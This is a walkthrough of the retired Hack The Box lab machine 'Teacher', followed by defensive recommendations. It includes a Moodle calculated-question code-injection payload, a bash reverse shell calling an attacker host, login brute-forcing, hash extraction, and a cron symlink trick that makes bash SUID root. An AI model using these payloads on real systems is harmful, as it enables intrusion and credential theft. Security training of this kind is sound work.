# HTB - Teacher

**IP Address:** `10.129.16.5`  
**OS:** `Linux (Debian, Apache 2.4.25)`  
**Difficulty:** `Medium`  
**Status:** `Retired`  
**Hostname / vhost:** `teacher` / `teacher.htb`  
**Tags:** #Linux #Web #Moodle #RCE #MySQL #Cron #WritableScript #Symlink #SUID

---

## Synopsis

Teacher exposes only **HTTP**. Directory listing and a mislabeled “PNG” under `/images/` leak a password hint for **Giovanni**, which brute-forces cleanly against **Moodle** on `teacher.htb`. As a teacher-capable user, you abuse a **calculated quiz question** weakness to get **RCE**, land a shell as **`www-data`**, read **`config.php`** for **MariaDB** credentials, and pull a legacy **MD5** from **`mdl_user`** that becomes the Linux password for **`giovanni`**.

Privilege escalation to root comes from a **root cron** job running **`backup.sh`**: a broad **`chmod 777 * -R`** after **`cd tmp`** lets you point a symlink at **`/usr/bin/backup.sh`**, make the script world-writable, replace it with a **`chmod u+s /bin/bash`**, then use **`bash -p`** as root.

---

## Skills Required

- `nmap` and NSE scripts for HTTP surface discovery
- Web content discovery (`wfuzz` or similar) and vhost / `hosts` alignment
- Moodle basics (login, course editing, quiz and question types)
- Linux shells, the `mysql` client, and recognizing **MD5** vs **bcrypt** hashes
- Lightweight process monitoring (`pspy`) and understanding **symlink** interaction with shell scripts

## Skills Learned

- Turning **mislabeled static files** and **directory listings** into credential material
- **Moodle** teacher workflows and **calculated-question** evaluation abuse (see public write-ups / CVE context)
- **Credential reuse** from application database fields to **local `su`**
- PrivEsc via **unsafe `chmod` globbing** on attacker-influenced paths (symlink → root-owned script)

---

## 1. Initial Enumeration

### 1.1 Connectivity Test

Check if the host is alive using ICMP:

```bash
ping -c 1 10.129.16.5
```

![ping](screenshots/teacher_01_ping.png)

The host responds, confirming it is reachable before heavier scans.

### 1.2 Port Scanning

Scan all TCP ports to identify open services:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.16.5 -oG allPorts
```

Why these flags:

- `-p-`: scan all 65,535 TCP ports  
- `--open`: show only open ports  
- `-sS`: SYN scan  
- `--min-rate 5000`: faster discovery scan  
- `-vvv`: verbose output for timing and port discovery  
- `-n`: no DNS resolution  
- `-Pn`: skip host discovery (treat host as up)  
- `-oG`: grepable output for tooling  

![nmap all ports 1](screenshots/teacher_02_nmap_allports_01.png)
![nmap all ports 2](screenshots/teacher_03_nmap_allports_02.png)

In this run, only **TCP 80** was open; a large number of ports were closed or filtered.

### 1.3 Targeted Scan

Run a deeper scan on the identified ports with version detection and default scripts:

```bash
nmap -sCV -p80 10.129.16.5 -oN targeted
```

- `-sC`: run default NSE scripts  
- `-sV`: detect service versions  
- `-oN`: human-readable output  

You can review the same output with:

```bash
cat targeted -l java
```

![nmap targeted](screenshots/teacher_04_nmap_targeted.png)

**Findings:**

| Port | Service | Notes |
|------|---------|--------|
| 80/tcp | HTTP | **Apache httpd 2.4.25 (Debian)**; page title **Blackhat highschool** |

To round out fingerprinting without relying only on `nmap` scripts, we also query the stack directly:

```bash
whatweb http://10.129.16.5
```

![whatweb](screenshots/teacher_05_whatweb.png)

---

## 2. Service Enumeration

### 2.1 NSE `http-enum` and directory exposure

The `http-enum` script surfaces common paths; combined with **directory listing** where enabled, you can discover assets not linked from the landing page.

```bash
nmap --script http-enum -p80 10.129.16.5 -oN WebScan
```

![http-enum](screenshots/teacher_06_http_enum.png)

Notable paths in this run included **`/css/`**, **`/images/`**, and **`/js/`** (listing enabled), plus **`/manual/`**.

### 2.2 Fake image / real text: `5.png`

Under **`/images/`**, we can see a lot of images from website:

![directory listing 1](screenshots/teacher_07_web_directory_listing_01.png)

One of them, the file named **`5.png`**, is served as an image but is actually **ASCII text**, which explains the browser error when rendering it as a PNG.

![directory listing 2](screenshots/teacher_08_web_directory_listing_02.png)

Let's verify this hypothesis from our machine:

```bash
wget http://10.129.16.5/images/5.png
file 5.png
cat 5.png
```

![5.png plaintext](screenshots/teacher_09_images_5png_plaintext.png)

The text is a helpdesk-style note from **Giovanni** revealing almost all of his password except the **last character**, constraining brute-force to a very small space.

### 2.3 Content discovery and vhost alignment

We brute-force directories from the site root to find hidden applications and administrative paths.

```bash
wfuzz -c --hc=404 --hl=249 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.129.16.5/FUZZ
```

![wfuzz](screenshots/teacher_10_wfuzz_content_discovery.png)

**Findings:** **`/moodle/`** exists (redirect). **`/phpmyadmin`** and **`/server-status`** returned **403** in this run.

Moodle is configured for a **virtual host** name, so add the hostname to your **`/etc/hosts`** (or equivalent) so redirects and absolute links resolve correctly:

```text
10.129.16.5 teacher.htb
```

### 2.4 Moodle login: completing the password

We generate candidates for the missing final character and fuzz the Moodle login **POST** body, filtering on response characteristics (for example, response length) to spot a successful login.

```bash
crunch 15 15 -t Th4C00lTheacha, > giovanni_dictionary_pass.txt
crunch 15 15 -t Th4C00lTheacha% >> giovanni_dictionary_pass.txt
crunch 15 15 -t Th4C00lTheacha@ >> giovanni_dictionary_pass.txt
crunch 15 15 -t Th4C00lTheacha^ >> giovanni_dictionary_pass.txt
```

![wfuzz moodle 1](screenshots/teacher_11_wfuzz_moodle_login_01.png)

Let's use this dictionary to find the correct password. In my case, all candidates returned `303` with `439` characters, so I filtered for responses with a different size:

```
wfuzz -c --hh=439 -t 200 -w giovanni_dictionary_pass.txt \
  -d 'anchor=&username=giovanni&password=FUZZ' \
  http://teacher.htb/moodle/login/index.php
```

![wfuzz moodle 2](screenshots/teacher_12_wfuzz_moodle_login_02.png)

**Verified credential:** `giovanni : Th4C00lTheacha#`

![moodle authenticated](screenshots/teacher_13_moodle_authenticated.png)

---

## 3. Foothold

### 3.1 Calculated-question injection and proof of execution

Public analysis (for example [SonarSource’s write-up on Moodle](https://www.sonarsource.com/blog/moodle-remote-code-execution)) explains how a **calculated** quiz answer formula can be abused to reach **code evaluation** paths. In practice, you enable editing on the **Algebra** course, create a **Quiz**, add a **Calculated** question, and place a small payload in the **answer formula** field. Execution is then triggered via a crafted request parameter (here, parameter **`0`**).

Use the course UI to add a **Quiz**, then add a **Calculated** question and set **Answer 1 formula** to:

```text
/*{a*/`$_GET[0]`;//{x}}
```

![add quiz](screenshots/teacher_14_moodle_quiz_add_activity.png)
![calculated payload](screenshots/teacher_15_moodle_calculated_question_payload.png)

To prove execution without immediately exposing a full shell, append an ICMP test to the vulnerable URL (exact URL varies with your session and `returnurl`; the important part is the trailing **`&0=...`** style parameter):

```text
&0=ping -c 1 <ATTACKER_IP>
```

Listen on the attacker host:

```bash
sudo tcpdump -i tun0 icmp -n
```

![rce ping 1](screenshots/teacher_16_moodle_rce_ping_tcpdump_01.png)

After sending the request in the URL, we should see the ICMP echo request in `tcpdump`:

![rce ping 2](screenshots/teacher_17_moodle_rce_ping_tcpdump_02.png)

At this point we have confirmed remote command execution (RCE).

### 3.2 Reverse shell as `www-data`

With execution confirmed, we switch to a **reverse shell** so we can work from a normal shell environment under the web user.

Start a listener on the attacker machine:

```bash
nc -nlvp 443
```

Trigger a bash reverse connection through the same **`&0=`** channel (URL-encode **`&`** inside the payload as needed for the browser):

```text
&0=bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1"
```

![rev url](screenshots/teacher_18_reverse_shell_url.png)

After triggering the payload, the listener receives the shell:

![rev nc](screenshots/teacher_19_reverse_shell_netcat.png)

You should land as **`www-data`**. The **`giovanni`** home directory is not readable yet as this user.

### 3.3 Moodle database credentials and user hashes

As `www-data` we can't access `/home/giovanni/` due to permissions. However, from the Moodle install path, **`config.php`** is readable to the web user and contains **MariaDB** connection settings.

```bash
cd /var/www/html/moodle
cat config.php
```

![config.php](screenshots/teacher_20_config_php.png)

Using those credentials locally:

```bash
mysql -uroot -p
```

```sql
SHOW DATABASES;
USE moodle;
SELECT username, password FROM mdl_user;
```

![mysql login](screenshots/teacher_21_mysql_login.png)

The `moodle` database contains many tables (388 in this run). The interesting one for credential pivoting is `mdl_user`:

![show databases](screenshots/teacher_22_mysql_show_databases.png)

Let's switch to the `moodle` database:

![use moodle](screenshots/teacher_23_mysql_use_moodle.png)

Now we can query `mdl_user` to list the stored password hashes:

![mdl_user](screenshots/teacher_24_mdl_user_hashes.png)

The **`Giovannibak`** row stores a **32-hex** value consistent with **MD5**, which is quick to crack offline compared to the **`$2y$`** bcrypt entries.

### 3.4 Local user access and user proof

We crack the MD5 offline (CrackStation, **hashcat** mode `0`, **John** `raw-md5`, etc.) and test reuse as the **Linux** password for **`giovanni`**.

![crackstation](screenshots/teacher_25_crackstation_giovannibak.png)

**Cracked plaintext:** `expelled`

```bash
su giovanni
```

```bash
cd ~
cat user.txt
```

![user flag](screenshots/teacher_26_user_flag_su_giovanni.png)

🏁 **User flag obtained**

---

## 4. Privilege Escalation

### 4.1 Discover root cron activity with `pspy`

To see what **root** executes periodically, we stage a small monitor (`pspy64`) via an HTTP download from the attacker host and run it until cron-driven activity appears.

On the attacker:

```bash
python3 -m http.server 4444
```

On the target (as `giovanni`):

```bash
cd /tmp
wget http://<ATTACKER_IP>:4444/pspy64
chmod +x pspy64
./pspy64
```

![pspy wget](screenshots/teacher_27_pspy_wget.png)

Observed behavior included **`/usr/bin/backup.sh`** running under cron, with **`tar`** and later **`chmod 777 * -R`** in **`/home/giovanni/work/tmp`**.

![pspy backup](screenshots/teacher_28_pspy_backup_sh_cron.png)

### 4.2 Inspect `backup.sh` and the unsafe `chmod` glob

The script’s logic archives course data, extracts into **`tmp`**, then applies a recursive world-writable permission change to **everything** in that directory — which is dangerous if an attacker can place symlinks there.

```bash
cat /usr/bin/backup.sh
```

![backup_sh](screenshots/teacher_29_backup_sh_symlink.png)

We can see this code:

```bash
#!/bin/bash
cd /home/giovanni/work;
tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;
tar -xf backup_courses.tar.gz;
chmod 777 * -R;
```

In other words: root enters Giovanni's `work` directory via cron, creates an archive under `tmp/`, extracts it, and then recursively sets permissions to `777` on everything in that directory. That `chmod 777 * -R` step is the core misconfiguration we abuse with symlinks.

### 4.3 Symlink the script and rewrite it; SUID `bash`

We create a symlink under **`~/work/tmp`** so the **`chmod 777 * -R`** pass follows it and makes **`/usr/bin/backup.sh`** world-writable. After the next cron run, **`giovanni`** can edit a script that **root** executes.

```bash
cd ~/work/tmp
touch test
ln -sf /usr/bin/backup.sh test
ls -la /bin/bash
```

![suid root](screenshots/teacher_30_suid_bash_root.png)

After permissions flip, replace **`/usr/bin/backup.sh`** with a minimal payload that sets the SUID bit on **`/bin/bash`**, wait for another cron execution, then:

```bash
bash -p
whoami
cat /root/root.txt
```

![root flag](screenshots/teacher_31_root_flag.png)

🏁 **Root flag obtained**

---
# ✅ MACHINE COMPLETE

---

## Summary of Exploitation Path

1. **Port scanning** showed only **HTTP (80)**; targeted scanning identified **Apache** and a school-themed site.
2. **`http-enum`** and **directory listing** exposed **`/images/`**; **`5.png`** was plaintext leaking a **partial Moodle password**.
3. **Directory brute-force** found **`/moodle/`**; **`/etc/hosts`** was updated for **`teacher.htb`**, then the **last character** of the password was recovered via **`wfuzz`**.
4. As **`giovanni`**, a **calculated quiz question** was abused for **RCE**, confirmed with **ICMP**, then upgraded to a **`www-data`** reverse shell.
5. **`config.php`** gave **MariaDB `root`** credentials; **`mdl_user`** contained a **crackable MD5** reused for **`su giovanni`** and the **user flag**.
6. **`pspy`** showed **`backup.sh`** run by **root**; a **symlink** plus **`chmod 777 * -R`** made **`backup.sh`** writable; editing it set **SUID** on **`/bin/bash`**, yielding **root** and the **root flag**.

---

## Defensive Recommendations

- **Disable directory listing** on public static paths (`Options -Indexes` or equivalent) and avoid serving sensitive notes as web-accessible files.
- **Do not store password hints** or secrets in files mislabeled as images; keep operational notes out of the document root.
- **Patch and harden Moodle**: keep core and plugins current; restrict who can create **calculated** and other high-risk question types; follow vendor hardening guidance.
- **Database least privilege**: Moodle should use a **dedicated DB account** with minimal privileges — not **`root`**, and not with unnecessary local superuser coupling.
- **Password storage**: migrate legacy **MD5** (or other weak formats) to strong modern hashes; enforce **unique** OS passwords unrelated to application DB fields.
- **Cron and scripts**: never run **`chmod 777 * -R`** over trees writable by users; avoid glob chmod patterns that follow **symlinks**; ensure scripts executed as **root** are **root-owned** and **not writable** by unprivileged users; consider **`chmod -h`** semantics and symlink hardening.
- **Monitoring**: alert on **SUID** changes on shells and unexpected edits to **`/usr/bin`** scripts.

